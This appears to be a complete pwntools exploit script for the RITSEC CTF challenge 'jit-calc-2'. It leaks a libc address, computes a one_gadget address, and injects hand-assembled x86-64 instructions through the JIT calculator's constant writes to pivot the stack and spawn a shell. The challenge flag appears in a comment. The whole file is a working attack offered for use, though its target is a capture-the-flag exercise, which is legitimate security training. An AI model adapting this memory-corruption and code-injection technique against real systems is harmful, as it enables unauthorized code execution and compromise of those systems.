from pwn import *
import sys, time, pyperclip

prog_name = './jit-calc-2'
context.binary = prog_name
debug = int(sys.argv[1])
online=False

if( debug == 0):
  r = remote("ctfchallenges.ritsec.club", 8083)
  online=True
elif(debug == 1):
  r = process(prog_name, aslr=False)

def halt():
  while True:
    log.info( r.recvline() )

def change_index(index):
  r.recvuntil("4: Run code")
  r.sendline("1")
  r.recvuntil("What index would you like")
  r.sendline(str(index))

def write_code(payload, leak=False):
  r.recvuntil("4: Run code")
  r.sendline("2")
  cnt=0
  for raw_now in payload:
    cnt += 1
    #print(raw_now)
    r.recvuntil("3: Write Constant Value",timeout=60)
    if raw_now[0] is 1:
      r.sendline("1")
    elif raw_now[0] is 2:
      r.sendline("2")
      r.recvuntil("Add Register 2 to Register 2")
      r.sendline(str(raw_now[1]))
    elif raw_now[0] is 3:
      r.sendline("3")
      r.recvuntil("Store to register 2")
      r.sendline(str(raw_now[1]))
      r.recvuntil("Enter the constant:")
      r.sendline(str(raw_now[2]))
  if not leak:
    r.recvuntil("Current index:")


def run_code():
  r.recvuntil("4: Run code")
  r.sendline("4")

def give_up():
  r.recvuntil("4: Run code")
  r.sendline("3")

def interactive():
  if not online:
    str_gdb="""/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid )
    print(str_gdb)
    pyperclip.copy(str_gdb)
  r.interactive()

def exploit():
  # 1 leak (useless..)
  payload1 = [ [1] ]
  write_code(payload1, leak=True)
  r.recvuntil("code is ")
  leak_1 = int("0x{0}".format(r.recvline().rstrip()), 16)
 
  offset_stdin = 0x1b9a00
  one_gadget_offset = 0xe666b
  if online :
    offset_stdin = 0x3c48e0
    one_gadget_offset = 0x45216
  
  libc_base_addr = leak_1 -131 -offset_stdin
  one_gadget = libc_base_addr + one_gadget_offset
  log.info("leak _IO_2_1_stdin_+131: 0x{0:x}".format(leak_1))
  log.info("libc addr: 0x{0:x}".format(libc_base_addr))
  log.info("one gadget addr: 0x{0:x}".format(one_gadget))
  
  # 2 
  # set null byte, so we have the 8-indexed size of memory range from 0x1b58 to 0x0058
  r.recvuntil("4: Run code")
  r.sendline("\x00")

  # 3
  # craft code to execute.
  # 0:  48 81 ec cc cc 00 00    sub    rsp,0xcccc
  # 7:  c3                      ret 
  # OR
  # 0:  ff 94 24 10 fe ff ff    call   QWORD PTR [rsp-0x1f0]
  # OR
  # 0:  48 81 ec f0 01 00 00    sub    rsp,0x1f0
  # 7:  c3                      ret
  
  #special_chunk = [3,1, 0xc3fffffe102494ff ]
  special_chunk = [3,1, 0xc3000001f0ec8148 ]
  payload1 = [ [3,1,0xff] for _ in range(8) ] + [ [2,4], [2,4], special_chunk ]  
  payload1 = payload1 + [[3,1,0xff] for _ in range(41)] + [[2,4],[2,4]] + [[3,1,one_gadget], [1]]
  #(512 -10*8 -2*3 -10*1)
  write_code(payload1)
  change_index(7)
  run_code() 
  interactive()  #RITSEC{J1T_c@n_G3t_3v3n_H@rd3r}
  return

exploit()
